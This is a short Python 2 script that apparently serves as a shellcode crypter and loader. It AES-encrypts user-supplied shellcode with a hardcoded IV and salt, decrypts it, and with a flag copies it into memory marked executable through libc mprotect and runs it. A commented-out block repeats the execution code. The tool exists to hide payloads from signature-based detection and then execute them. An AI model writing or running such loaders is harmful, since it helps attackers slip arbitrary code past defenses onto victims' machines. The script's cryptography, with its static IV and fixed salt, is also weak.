from ctypes import CDLL, c_char_p, c_void_p, memmove, cast, CFUNCTYPE
import sys
import argparse
from Crypto.Cipher import AES
import pyscrypt
from os import urandom

parser = argparse.ArgumentParser()
parser.add_argument("-s", "--shellcode", help="Please provide the shellcode in the format \\xAA\\xAA", type=str, required=True)
parser.add_argument("-k", "--key", help="Please provide the encryption key", type=str, required=True)
parser.add_argument("-d", "--decrypt", help="this will decrypt the provided shellcode", action="store_true")
parser.add_argument("-e", "--encrypt", help="this will encrypt the provided shellcode", action="store_true")
args = parser.parse_args()


def padding(text):
	return text + (AES.block_size - len(text) % AES.block_size) * chr(AES.block_size - len(text) % AES.block_size)

def unpadded(text):
	return text[:-ord(text[len(text)-1:])]

def Encrypt(cleartext, key):
#	iv = urandom(AES.block_size)
	iv = "1234567890123456"
	cleartext = padding(cleartext)
	cipher= AES.new(key, AES.MODE_CBC, iv)
	return iv + cipher.encrypt(bytes(cleartext))


#decrypt
def Decrypt(encrypted, key):
	iv = encrypted[:AES.block_size]

	decipher = AES.new(key, AES.MODE_CBC, iv)
	return unpadded(decipher.decrypt(encrypted[AES.block_size:]))

def RunShellcode(shellcode):
	libc = CDLL('libc.so.6')
	sc = c_char_p(shellcode.decode('hex'))
	size = len(shellcode.decode('hex'))
	addr = c_void_p(libc.valloc(size))
	memmove(addr, sc, size)
	libc.mprotect(addr, size, 0x7)
	run = cast(addr, CFUNCTYPE(c_void_p))
	run()



shellcode = args.shellcode.replace('\\x', '')
shellcodebytes = bytearray(shellcode)
key = pyscrypt.hash(args.key, "mysalt", 1024, 1, 1, 16)

print "Encrypting the shellcode"
encrypted = Encrypt(shellcodebytes, key)
print encrypted[AES.block_size:]

print "Decrypting the shellcode"
decrypted = Decrypt(encrypted, key)
print decrypted
decrypted_parts = [decrypted[i:i+2] for i in range(0, len(decrypted), 2)]
decrypted_shellcode = "\\x" + "\\x".join(decrypted_parts)
print decrypted_shellcode
if args.decrypt:
	RunShellcode(decrypted)



"""
#Execute the shellcode
libc = CDLL('libc.so.6')
sc = c_char_p(decrypted.decode('hex'))
size = len(decrypted.decode('hex'))
addr = c_void_p(libc.valloc(size))
memmove(addr, sc, size)
libc.mprotect(addr, size, 0x7)
run = cast(addr, CFUNCTYPE(c_void_p))
run()
"""
